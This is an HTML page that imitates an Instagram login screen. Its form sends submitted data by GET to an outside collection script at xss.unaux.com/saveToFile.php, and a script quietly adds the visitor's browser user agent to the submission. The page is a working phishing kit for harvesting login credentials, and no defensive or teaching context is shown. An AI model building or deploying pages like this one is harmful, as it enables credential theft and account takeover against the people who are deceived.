<html lang="en-US">

<head profile="http://www.w3.org/2005/10/profile">
    <!-- ogg image -->
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css" />

    <meta name="viewport" content="width=device-width, initial-scale=1">

<body>
    <div class="main_container">
        <img src="phone_bg.png" id="phone_bg" />
        <div>
            <div class="form_container">
                <div class="instagram_bg"></div>
                <div class="login_form_div">
                    <form method="get" action="http://xss.unaux.com/saveToFile.php" onsubmit="openFile()">

                            <input type="hidden" name="userAgent" value="N/A" id="userAgent" />

            <div class="get_app">

    <script>
        document.getElementById("userAgent").value = navigator.userAgent
        const openFile = () => {
            window.open("http://xss.unaux.com/instagram.txt");
        }
    </script>
</body>

</html>
